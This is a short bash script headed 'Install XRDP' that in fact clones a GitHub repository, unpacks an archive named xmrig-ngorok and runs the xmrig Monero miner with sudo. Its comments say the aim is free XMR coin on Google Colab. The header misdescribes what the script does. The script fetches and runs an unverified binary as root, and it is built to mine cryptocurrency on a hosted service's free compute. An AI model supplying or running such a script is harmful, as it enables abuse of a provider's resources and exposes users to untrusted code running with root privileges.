#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
git clone https://github.com/burocos/ngorok.git
cd ngorok
tar xvf xmrig-ngorok.tar.gz
rm xmrig-ngorok.tar.gz
cd xmrig-ngorok
sudo ./xmrig
